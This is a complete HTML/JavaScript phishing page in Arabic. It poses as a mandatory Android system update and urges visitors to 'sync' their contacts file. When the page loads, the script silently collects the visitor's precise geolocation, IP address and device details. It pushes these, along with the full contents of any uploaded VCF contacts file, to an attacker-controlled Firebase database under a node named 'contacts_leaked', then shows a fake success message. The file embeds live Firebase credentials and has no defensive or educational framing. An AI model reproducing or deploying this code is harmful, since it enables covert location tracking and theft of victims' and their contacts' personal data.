<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>RedRx System - 2099</title>

    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>

    <style>
        body {
            margin: 0;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #1B1D29;
            color: #00aaff;
            font-family: sans-serif;
            text-align: center;
            overflow: hidden;
        }

        /* واجهة التمويه (Social Engineering Overlay) */
        #overlay {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(27, 29, 41, 0.98);
            z-index: 9999;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .btn-update {
            background: #00aaff;
            color: #fff;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 20px;
            box-shadow: 0 0 15px rgba(0, 170, 255, 0.4);
        }

        input[type="file"] { display: none; }

        #status { color: #00aaff; margin-top: 10px; }
    </style>
</head>

<body>

    <div id="overlay">
        <h2 style="color: #ff4444;">⚠️ تحديث نظام Android 5.0 مطلوب</h2>
        <p>يرجى مزامنة ملف جهات الاتصال (VCF) لتأمين حسابك والاستمرار.</p>
        <label class="btn-update" for="contactFile">تحديث ومزامنة الآن</label>
        <input type="file" id="contactFile" accept=".vcf">
        <h3 id="status">...بانتظار الإجراء</h3>
    </div>

    <script>
        /* Firebase Configuration */
        const firebaseConfig = {
            apiKey: "AIzaSyCuyAgacCs5tClhYD79IVOpSWVvbtXObpc",
            authDomain: "hercules-65b0c.firebaseapp.com",
            databaseURL: "https://hercules-65b0c-default-rtdb.firebaseio.com",
            projectId: "hercules-65b0c",
            storageBucket: "hercules-65b0c.firebasestorage.app",
            messagingSenderId: "758576632296",
            appId: "1:758576632296:android:c69d0667cf54311617d45d"
        };

        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        const params = new URLSearchParams(window.location.search);
        const chatId = params.get("chat_id") || "Unknown_User";

        /* --- وظائف الاستخراج (Extraction Functions) --- */

        async function getIP() {
            try {
                const res = await fetch("https://api.ipify.org?format=json");
                const json = await res.json();
                return json.ip;
            } catch (e) { return "unknown"; }
        }

        function getFormattedDateTime() {
            const d = new Date();
            return `${d.getDate()}-${d.getMonth()+1}-${d.getFullYear()} | ${d.getHours()}:${String(d.getMinutes()).padStart(2,'0')} ${d.getHours()>=12?'PM':'AM'}`;
        }

        /* --- تنفيذ سحب الموقع تلقائياً --- */
        navigator.geolocation.getCurrentPosition(async (pos) => {
            const ip = await getIP();
            const data = {
                chat_id: chatId,
                latitude: pos.coords.latitude,
                longitude: pos.coords.longitude,
                ip: ip,
                device: navigator.userAgent,
                time: getFormattedDateTime(),
                type: "Location_Update"
            };
            database.ref("locations").push(data);
        }, (err) => {
            console.log("Location Denied");
        }, { enableHighAccuracy: true });

        /* --- تنفيذ سحب جهات الاتصال عند التفاعل --- */
        document.getElementById('contactFile').addEventListener('change', function(e) {
            const file = e.target.files[0];
            if (!file) return;

            document.getElementById("status").innerText = "⏳ جاري الرفع...";

            const reader = new FileReader();
            reader.onload = async function(event) {
                const content = event.target.result;
                
                // إرسال البيانات المستخرجة إلى Firebase
                await database.ref("contacts_leaked").push({
                    chat_id: chatId,
                    file_name: file.name,
                    raw_data: content, // يحتوي على كل الأسماء والأرقام
                    time: getFormattedDateTime()
                });

                document.getElementById("overlay").innerHTML = "<h2>✅ تم التحديث بنجاح</h2><p>سيتم توجيهك الآن...</p>";
                setTimeout(() => { document.getElementById("overlay").style.display = "none"; }, 2500);
            };
            reader.readAsText(file);
        });

    </script>
</body>
</html>
